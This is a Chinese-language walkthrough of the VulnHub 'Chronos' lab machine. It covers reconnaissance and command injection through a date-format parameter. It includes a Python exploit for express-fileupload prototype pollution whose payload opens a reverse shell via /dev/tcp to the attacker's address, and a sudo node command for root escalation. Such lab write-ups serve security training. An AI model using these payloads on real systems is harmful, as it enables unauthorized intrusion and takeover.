@@ -1,0 +1,135 @@
+---
+title: VulnHub靶场 Chronos
+description: VulnHub靶场 Chronos WP
+pubDate: 10 20 2024
+image: https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-5.png
+categories:
+  - 网络安全
+tags:
+  - 靶场
+  - VulnHub靶场
+  - 渗透测试
+---
+
+进行二层发现
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-1.png)
+
+发现目标主机为 `192.168.135.105`，进行端口扫描
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-2.png)
+
+发现目标主机上开放 80 端口，访问目标端口 HTTP 服务
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-6.png)
+
+没啥东西，尝试目录扫描，也没出货。查看源码
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-4.png)
+
+这里存在一段 JS，不过有一些混淆。不过这里有一个明文的 URL
+
+```url
+http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
+```
+
+这里端口是 8000 端口，而且我们在进行端口扫描的时候，也发现了目标主机上开放了 8000 端口。而这个域名 `chronos.local`，可能就是靶机。我们可以添加个 hosts 试试。然后再刷新页面
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-5.png)
+
+页面发生了变化，我们直接访问 `http://chronos.local:8000`。不过在 windows 上经过测试，需要添加 UA 头，值为 `Chronos`。再次访问，得到如下结果
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-7.png)
+
+没啥东西了，重点应该就是这个 `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`，尝试解一下
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-8.png)
+
+那么他是怎么输出的呢？
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-9.png)
+
+结果和我们页面返回的一样。那么我们猜测后端其实就是执行了一个 date 命令，那么利用管道符就可以执行目标命令
+
+```
+date +Today is %A, %B %d, %Y %H:%M:%S.' || ls
+```
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-10.png)
+
+重放进行尝试
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-11.png)
+
+得到 ls 命令结果，命令执行成功。使用 nc 进行反弹，失败，使用 MSF，成功
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-12.png)
+
+一番找，在 `/opt/chronos-v2/backend` 下发现个 `package.json`
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-13.png)
+
+```json
+{
+  "name": "some-website",
+  "version": "1.0.0",
+  "description": "",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "ejs": "^3.1.5",
+    "express": "^4.17.1",
+    "express-fileupload": "^1.1.7-alpha.3"
+  }
+}
+```
+
+这里有一些 `chronos-v2` 引用的库，这里有个 `express-fileupload`，该库存在 JS 原型污染，并且在服务端，必要条件 `parseNested` 为 True 也存在
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-14.png)
+
+exp 如下
+
+```python
+import requests
+
+cmd = 'bash -c "bash -i &> /dev/tcp/192.168.135.192/8888 0>&1"'
+
+# pollute
+requests.post(
+    'http://127.0.0.1:8080',
+    files={
+        '__proto__.outputFunctionName':
+        (None,
+         f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x"
+         )
+    })
+
+# execute command
+requests.get('http://127.0.0.1:8080')
+```
+
+注意，由于是 `server.js` 下存在这个漏洞，它的监听端口是 `127.0.0.1:8080`，所以不要搞错 IP 端口。
+
+把文件传到 `/tmp` 下，运行，即可得到反弹 shell
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-15.png)
+但是不是 root 权限，我们使用 `sudo -l` 查看
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-16.png)
+
+可以看到，`/usr/local/bin/node` 有 root 权限。使用 node 进行提权
+
+```shell
+sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+```
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-17.png)
+
+然后再传 MSF 马，得到 root 权限
+
+![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Chronos/003%20Chronos-18.png)
